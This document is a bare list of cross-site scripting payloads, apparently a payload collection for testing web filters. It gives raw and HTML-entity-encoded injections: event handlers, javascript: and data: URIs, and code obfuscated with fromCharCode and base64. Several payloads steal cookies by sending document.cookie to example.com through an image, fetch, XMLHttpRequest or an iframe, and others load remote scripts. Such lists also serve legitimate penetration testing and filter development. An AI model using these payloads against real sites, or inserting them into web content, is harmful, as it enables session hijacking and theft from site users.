<img src="x" onerror="alert(1)">
<a href="javascript:alert(1)">XSS</a>
<body onload="alert(1)">
<script>document.write('<img src="http://example.com/xss.png?c=' + document.cookie + '">')</script>
<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>
<img src="x" onerror="eval(atob('YWxlcnQoMSk='))">
<script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";a.click();</script>
<script>var s=document.createElement("script");s.src="http://example.com/xss.js";document.body.appendChild(s);</script>
<script>var i=new Image();i.src="http://example.com/xss.png?c="+document.cookie;document.body.appendChild(i);</script>
<script>fetch("http://example.com/xss.php?c="+document.cookie);</script>
<script>var x=new XMLHttpRequest();x.open("GET","http://example.com/xss.php?c="+document.cookie,true);x.send();</script>
<script>var s=document.createElement("iframe");s.src="http://example.com/xss.php?c="+document.cookie;document.body.appendChild(s);</script>
<script>var l=document.createElement("link");l.rel="stylesheet";l.href="http://example.com/xss.css";document.head.appendChild(l);</script>
&#x3C;img src=x onerror=alert('Payload1')&#x3E;
&#x3C;svg onload=alert('Payload2')&#x3E;
&#x3C;object data=javascript:alert('Payload3')&#x3E;
&#x3C;body onload=alert('Payload4')&#x3E;
&#x3C;img src=x:alert(alt) onerror=eval(src) alt='Payload5'&#x3E;
&#x3C;script&#x3E;eval(String.fromCharCode(97,108,101,114,116,40,39,Payload6,39,41))&#x3C;/script&#x3E;
&#x3C;!--%2Balert('Payload7')%2B--&#x3E;
&#x3C;style&#x3E;*{x:expression(alert('Payload8'))}&#x3C;/style&#x3E;
&#x3C;input value=`` onfocus=alert('Payload9') autofocus&#x3E;
&#x3C;form&#x3E;&#x3C;button onclick=alert('Payload10')&#x3E;X&#x3C;/button&#x3E;&#x3C;/form&#x3E;
&#x3C;iframe src=javascript:alert('Payload11')&#x3E;&#x3C;/iframe&#x3E;
&#x3C;a href=javascript:alert('Payload12')&#x3E;Link&#x3C;/a&#x3E;
&#x3C;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUGF5bG9hZDEzJyk8L3NjcmlwdD4&#x3E;Link&#x3C;/a&#x3E;
&#x3C;div onmouseover=alert('Payload14')&#x3E;Hover over me&#x3C;/div&#x3E;
&#x3C;input type=image src=x onerror=alert('Payload15')&#x3E;
&#x3C;audio src=javascript:alert('Payload16')&#x3E;&#x3C;/audio&#x3E;
&#x3C;video src=javascript:alert('Payload17')&#x3E;&#x3C;/video&#x3E;
